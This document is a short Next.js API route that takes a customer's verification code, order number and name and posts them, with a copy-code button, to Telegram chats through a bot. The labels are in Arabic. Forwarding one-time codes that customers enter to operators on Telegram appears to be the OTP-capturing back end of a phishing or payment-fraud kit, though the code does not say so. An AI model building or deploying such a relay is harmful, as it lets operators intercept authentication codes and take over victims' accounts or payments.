import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const telegramChatIds = (process.env.TELEGRAM_CHAT_ID ?? "")
    .split(",")
    .map(id => id.trim())
    .filter(Boolean);

  await Promise.all(
    telegramChatIds.map(chat_id =>
      fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id,
            text,
            reply_markup: {
              inline_keyboard: [
                [{ text: "📋 نسخ الكود", copy_text: { text: code } }],
              ],
            },
          }),
        }
      )
    )
  );

  return NextResponse.json({ ok: true });
}
